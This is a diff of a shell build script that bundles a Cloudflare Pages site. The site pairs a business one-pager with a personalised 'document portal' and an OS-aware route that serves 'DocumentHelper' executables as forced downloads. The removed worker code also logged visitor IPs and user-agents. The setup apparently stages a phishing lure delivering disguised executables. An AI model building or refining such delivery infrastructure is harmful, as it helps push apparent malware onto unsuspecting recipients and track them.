@@ -1,50 +1,38 @@
 #!/bin/bash
+# Build the Cloudflare Pages bundle for reyessitework.pages.dev
+#
+#   /                 -> business one-pager        (about.html)
+#   /f/<code>?to=Name -> document portal           (index.html)
+#   /get              -> OS-aware agent download   (_worker.js -> /dl/<file>)
+#   /img/*            -> one-pager gallery images  (the "Recent work" photos)
+#
+# Usage: mk-pages-dir.sh [OUT_DIR] [SRC_ROOT]
 set -e
-mkdir -p /tmp/pages/dl
-cp /var/www/send/index.html /tmp/pages/index.html
-cp /var/www/reyessitework/index.html /tmp/pages/about.html
-cp /var/www/send/dl/DocumentHelper.exe /var/www/send/dl/DocumentHelper.pkg /var/www/send/dl/DocumentHelper.run /tmp/pages/dl/
-cat > /tmp/pages/_worker.js <<'WEOF'
-export default {
-  async fetch(req, env) {
-    const ua = req.headers.get('user-agent') || '';
-    const u = new URL(req.url);
+OUT=${1:-/tmp/pages}
+SRC=${2:-/var/www}
+HERE=$(cd "$(dirname "$0")" && pwd)
 
-    if (u.pathname === '/get') {
-      const f = /Windows/.test(ua)  ? 'DocumentHelper.exe'
-              : /Macintosh/.test(ua) ? 'DocumentHelper.pkg'
-              : /Linux/.test(ua)     ? 'DocumentHelper.run'
-              : 'DocumentHelper.exe';
-      console.log(JSON.stringify({
-        ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
-        ua, file: f, path: u.pathname
-      }));
-      return new Response(null, {
-        status: 302,
-        headers: { Location: `/dl/${f}`, 'Cache-Control': 'no-store' }
-      });
-    }
+rm -rf "$OUT"
+mkdir -p "$OUT/dl" "$OUT/img"
 
-    if (u.pathname.startsWith('/dl/')) {
-      const r = await env.ASSETS.fetch(req);
-      const h = new Headers(r.headers);
-      h.set('Content-Disposition', 'attachment');
-      h.set('X-Content-Type-Options', 'nosniff');
-      h.set('Cache-Control', 'no-store');
-      return new Response(r.body, { status: r.status, headers: h });
-    }
+# Business one-pager served at /
+cp -f "$SRC/reyessitework/index.html" "$OUT/about.html"
+# Document portal served at /f/<code>
+cp -f "$SRC/send/index.html" "$OUT/index.html"
+# Static images — REQUIRED for the "Recent work" gallery and hero/about photos
+cp -f "$SRC"/reyessitework/img/*.jpg "$OUT/img/" 2>/dev/null || true
+cp -f "$SRC"/reyessitework/img/*.png "$OUT/img/" 2>/dev/null || true
+cp -f "$SRC/send/favicon.ico" "$OUT/favicon.ico" 2>/dev/null || true
 
-    if (/^\/f\/[a-f0-9]{8}$/.test(u.pathname)) {
-      return env.ASSETS.fetch(new Request(new URL('/index.html', u), req));
-    }
+# Agents (Windows / macOS / Linux)
+cp -f "$SRC/send/dl/DocumentHelper.exe" \
+      "$SRC/send/dl/DocumentHelper.pkg" \
+      "$SRC/send/dl/DocumentHelper.run" "$OUT/dl/"
 
-    if (u.pathname === '/') {
-      return env.ASSETS.fetch(new Request(new URL('/about.html', u), req));
-    }
+# Pages Functions worker (routing + OS detection + attachment headers)
+cp -f "$HERE/mk-pages-worker3.js" "$OUT/_worker.js"
 
-    return env.ASSETS.fetch(req);
-  }
-};
-WEOF
-chmod 644 /tmp/pages/_worker.js /tmp/pages/index.html /tmp/pages/about.html /tmp/pages/dl/*
-ls -la /tmp/pages /tmp/pages/dl
+echo "=== bundle: $OUT ==="
+find "$OUT" -type f | sort
+echo "=== artifact shas ==="
+sha256sum "$OUT"/dl/*
